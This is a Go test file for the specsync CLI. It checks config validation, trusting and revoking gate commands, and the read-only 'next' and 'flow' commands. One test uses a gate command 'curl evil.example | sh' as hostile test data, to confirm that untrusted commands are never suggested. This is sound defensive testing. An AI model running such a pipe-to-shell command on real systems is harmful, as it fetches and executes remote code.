package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

func waysRepo(t *testing.T, cfg string) (repo string, env []string) {
	t.Helper()
	repo, env = firstUseEnv(t)
	if err := os.MkdirAll(filepath.Join(repo, "openspec", "changes"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(repo, "openspec", "specsync.yml"), []byte(cfg), 0o644); err != nil {
		t.Fatal(err)
	}
	env = append(env, "SPECSYNC_TRUST_FILE="+filepath.Join(t.TempDir(), "trust.json"))
	return repo, env
}

func TestDoctorConfigReportsTypoWithLine(t *testing.T) {
	bin := buildSpecsyncBinary(t)
	repo, env := waysRepo(t, "board: acme/1\ngate:\n  - {name: a, run: b}\n")
	out, err := runIn(t, bin, repo, env, "doctor", "config")
	if err == nil {
		t.Fatalf("a config with problems must exit non-zero:\n%s", out)
	}
	if !strings.Contains(out, "line 2") || !strings.Contains(out, `did you mean "gates"`) {
		t.Fatalf("want the typo with its line:\n%s", out)
	}
}

func TestDoctorConfigValidConfigAndDefaults(t *testing.T) {
	bin := buildSpecsyncBinary(t)
	repo, env := waysRepo(t, "flow: strict\ngates:\n  - {name: t, run: make test}\n")
	out, err := runIn(t, bin, repo, env, "doctor", "config")
	if err != nil || !strings.Contains(out, "config is valid") || !strings.Contains(out, "not trusted") {
		t.Fatalf("err=%v\n%s", err, out)
	}
	bare, benv := firstUseEnv(t)
	out, err = runIn(t, bin, bare, benv, "doctor", "config")
	if err != nil || !strings.Contains(out, "defaults apply") {
		t.Fatalf("err=%v\n%s", err, out)
	}
}

func TestTrustDryRunWritesNothingThenRecords(t *testing.T) {
	bin := buildSpecsyncBinary(t)
	repo, env := waysRepo(t, "gates:\n  - {name: t, run: make test}\n")
	trustFile := ""
	for _, e := range env {
		if strings.HasPrefix(e, "SPECSYNC_TRUST_FILE=") {
			trustFile = strings.TrimPrefix(e, "SPECSYNC_TRUST_FILE=")
		}
	}
	out, err := runIn(t, bin, repo, env, "trust")
	if err != nil || !strings.Contains(out, "make test") || !strings.Contains(out, "specsync trust -yes") {
		t.Fatalf("err=%v\n%s", err, out)
	}
	if _, statErr := os.Stat(trustFile); statErr == nil {
		t.Fatal("trust without -yes must not record anything")
	}
	out, err = runIn(t, bin, repo, env, "trust", "-yes", "-dry-run")
	if err != nil || !strings.Contains(out, "DRY RUN") {
		t.Fatalf("err=%v\n%s", err, out)
	}
	if _, statErr := os.Stat(trustFile); statErr == nil {
		t.Fatal("a dry run must not record trust")
	}
	if out, err := runIn(t, bin, repo, env, "trust", "-yes"); err != nil {
		t.Fatalf("trust: %v\n%s", err, out)
	}
	if _, statErr := os.Stat(trustFile); statErr != nil {
		t.Fatalf("trust must record: %v", statErr)
	}
	out, err = runIn(t, bin, repo, env, "doctor", "config")
	if err != nil || strings.Contains(out, "not trusted") {
		t.Fatalf("after trust: err=%v\n%s", err, out)
	}
	if out, err := runIn(t, bin, repo, env, "trust", "-revoke"); err != nil {
		t.Fatalf("revoke: %v\n%s", err, out)
	}
	out, _ = runIn(t, bin, repo, env, "doctor", "config")
	if !strings.Contains(out, "not trusted") {
		t.Fatalf("after revoke:\n%s", out)
	}
}

func TestTrustRefusesABrokenConfig(t *testing.T) {
	bin := buildSpecsyncBinary(t)
	repo, env := waysRepo(t, "gates: make\n")
	out, err := runIn(t, bin, repo, env, "trust")
	if err == nil || !strings.Contains(out, "fix the config first") {
		t.Fatalf("err=%v\n%s", err, out)
	}
}

func gitSnapshot(t *testing.T, repo string) string {
	t.Helper()
	var b strings.Builder
	for _, args := range [][]string{
		{"status", "--porcelain", "-uall"},
		{"for-each-ref"},
		{"config", "--list", "--local"},
		{"stash", "list"},
		{"worktree", "list"},
	} {
		cmd := exec.Command("git", args...)
		cmd.Dir = repo
		out, err := cmd.CombinedOutput()
		if err != nil {
			t.Fatalf("git %v: %v\n%s", args, err, out)
		}
		b.WriteString(strings.Join(args, " ") + "\n" + string(out))
	}
	idx, _ := os.ReadFile(filepath.Join(repo, ".git", "index"))
	b.WriteString(string(idx))
	filepath.WalkDir(repo, func(p string, d os.DirEntry, err error) error {
		if err == nil && d.IsDir() && d.Name() == ".git" {
			return filepath.SkipDir
		}
		if err == nil {
			info, _ := d.Info()
			b.WriteString(fmt.Sprintf("%s %d %d\n", p, info.Size(), info.ModTime().UnixNano()))
		}
		return nil
	})
	return b.String()
}

func gitIn(t *testing.T, repo string, args ...string) {
	t.Helper()
	cmd := exec.Command("git", args...)
	cmd.Dir = repo
	if out, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("git %v: %v\n%s", args, err, out)
	}
}

func TestNextAndFlowOnWorkWithOpenTasks(t *testing.T) {
	bin := buildSpecsyncBinary(t)
	repo, env := waysRepo(t, "gates:\n  - {name: t, run: make test}\n")
	change := filepath.Join(repo, "openspec", "changes", "add-x")
	if err := os.MkdirAll(change, 0o755); err != nil {
		t.Fatal(err)
	}
	os.WriteFile(filepath.Join(change, "proposal.md"), []byte("# Add x\n"), 0o644)
	os.WriteFile(filepath.Join(change, "tasks.md"), []byte("- [x] 1.1 a\n- [ ] 1.2 b\n"), 0o644)
	gitIn(t, repo, "checkout", "-q", "-b", "feat/7-add-x")

	out, err := runIn(t, bin, repo, env, "next", "-state=off")
	if err != nil || !strings.Contains(out, "Next: build") || !strings.Contains(out, "1/2") {
		t.Fatalf("next: err=%v\n%s", err, out)
	}
	out, err = runIn(t, bin, repo, env, "flow", "-state=off")
	if err != nil || !strings.Contains(out, "[>] build") || !strings.Contains(out, "[x] new") || !strings.Contains(out, "[ ] gate") {
		t.Fatalf("flow: err=%v\n%s", err, out)
	}
	out, err = runIn(t, bin, repo, env, "next", "-json", "-state=off")
	if err != nil || !strings.Contains(out, `"step": "build"`) {
		t.Fatalf("next -json: err=%v\n%s", err, out)
	}
}

func TestNextWithNoWorkSuggestsStarting(t *testing.T) {
	bin := buildSpecsyncBinary(t)
	repo, env := waysRepo(t, "")
	out, err := runIn(t, bin, repo, env, "next", "-state=off")
	if err != nil || !strings.Contains(out, "Next: new") || !strings.Contains(out, "specsync pull -issue") {
		t.Fatalf("err=%v\n%s", err, out)
	}
}

func TestNextAndFlowChangeNothing(t *testing.T) {
	bin := buildSpecsyncBinary(t)
	repo, env := waysRepo(t, "gates:\n  - {name: t, run: make test}\n")
	gitIn(t, repo, "add", "-A")
	gitIn(t, repo, "-c", "user.name=t", "-c", "user.email=t@example.com", "commit", "-q", "-m", "config")
	os.WriteFile(filepath.Join(repo, "wip.txt"), []byte("x"), 0o644)
	before := gitSnapshot(t, repo)
	for _, args := range [][]string{{"next"}, {"next", "-json"}, {"flow"}, {"flow", "-json"}, {"next", "-state=off"}} {
		if out, err := runIn(t, bin, repo, env, args...); err != nil {
			t.Fatalf("%v: %v\n%s", args, err, out)
		}
	}
	if after := gitSnapshot(t, repo); after != before {
		t.Fatalf("next and flow must not change the worktree, index, refs or config:\n--- before\n%s\n--- after\n%s", before, after)
	}
}

func TestNextReportsUnknownPullRequestStateOffline(t *testing.T) {
	bin := buildSpecsyncBinary(t)
	repo, env := waysRepo(t, "gates:\n  - {name: t, run: make test}\n")
	change := filepath.Join(repo, "openspec", "changes", "add-x")
	os.MkdirAll(change, 0o755)
	os.WriteFile(filepath.Join(change, "proposal.md"), []byte("# Add x\n"), 0o644)
	os.WriteFile(filepath.Join(change, "tasks.md"), []byte("- [x] 1.1 a\n"), 0o644)
	gitIn(t, repo, "checkout", "-q", "-b", "feat/7-add-x")
	gitIn(t, repo, "add", "-A")
	gitIn(t, repo, "-c", "user.name=t", "-c", "user.email=t@example.com", "commit", "-q", "-m", "work")
	head, _ := exec.Command("git", "-C", repo, "rev-parse", "HEAD").Output()
	stamp := filepath.Join(repo, ".git", "specsync")
	os.MkdirAll(stamp, 0o755)
	os.WriteFile(filepath.Join(stamp, "gates-passed"), head, 0o644)

	out, err := runIn(t, bin, repo, env, "next", "-state=off")
	if err != nil || !strings.Contains(out, "pull request state unknown") || strings.Contains(out, "gh pr create") {
		t.Fatalf("err=%v\n%s", err, out)
	}
}

func TestNextAsksForChangeWhenSeveralMatch(t *testing.T) {
	bin := buildSpecsyncBinary(t)
	dir := t.TempDir()
	for _, slug := range []string{"one", "two"} {
		c := filepath.Join(dir, "openspec", "changes", slug)
		os.MkdirAll(c, 0o755)
		os.WriteFile(filepath.Join(c, "proposal.md"), []byte("# "+slug+"\n"), 0o644)
	}
	env := append(os.Environ(), "HOME="+t.TempDir(), "SPECSYNC_TRUST_FILE="+filepath.Join(t.TempDir(), "t.json"))
	out, err := runIn(t, bin, dir, env, "next", "-state=off")
	if err == nil || !strings.Contains(out, "2 changes here; pass -change <slug>") {
		t.Fatalf("err=%v\n%s", err, out)
	}
	out, err = runIn(t, bin, dir, env, "flow", "-state=off", "-change", "one")
	if err != nil || !strings.Contains(out, "flow:") {
		t.Fatalf("err=%v\n%s", err, out)
	}
}

func TestFlowJSONCarriesNoEmptySlugPaths(t *testing.T) {
	bin := buildSpecsyncBinary(t)
	repo, env := waysRepo(t, "")
	out, err := runIn(t, bin, repo, env, "flow", "-json", "-state=off")
	if err != nil || strings.Contains(out, "changes//") {
		t.Fatalf("err=%v\n%s", err, out)
	}
}

func TestDoctorConfigNotesReservedKeys(t *testing.T) {
	bin := buildSpecsyncBinary(t)
	repo, env := waysRepo(t, "worktrees: {dir: ../w}\n")
	out, err := runIn(t, bin, repo, env, "doctor", "config")
	if err != nil || !strings.Contains(out, "reserved for flow-verbs") {
		t.Fatalf("err=%v\n%s", err, out)
	}
}

func TestNextNeverSuggestsUntrustedGateCommands(t *testing.T) {
	bin := buildSpecsyncBinary(t)
	repo, env := waysRepo(t, "gates:\n  - {name: t, run: \"curl evil.example | sh\"}\n")
	change := filepath.Join(repo, "openspec", "changes", "add-x")
	os.MkdirAll(change, 0o755)
	os.WriteFile(filepath.Join(change, "proposal.md"), []byte("# Add x\n"), 0o644)
	os.WriteFile(filepath.Join(change, "tasks.md"), []byte("- [x] 1.1 a\n"), 0o644)
	gitIn(t, repo, "checkout", "-q", "-b", "feat/7-add-x")
	gitIn(t, repo, "add", "-A")
	gitIn(t, repo, "-c", "user.name=t", "-c", "user.email=t@example.com", "commit", "-q", "-m", "work")
	for _, args := range [][]string{{"next", "-state=off"}, {"next", "-json", "-state=off"}, {"flow", "-json", "-state=off"}} {
		out, err := runIn(t, bin, repo, env, args...)
		if err != nil || strings.Contains(out, "evil.example") || !strings.Contains(out, "specsync trust") {
			t.Fatalf("%v: err=%v\n%s", args, err, out)
		}
	}
}
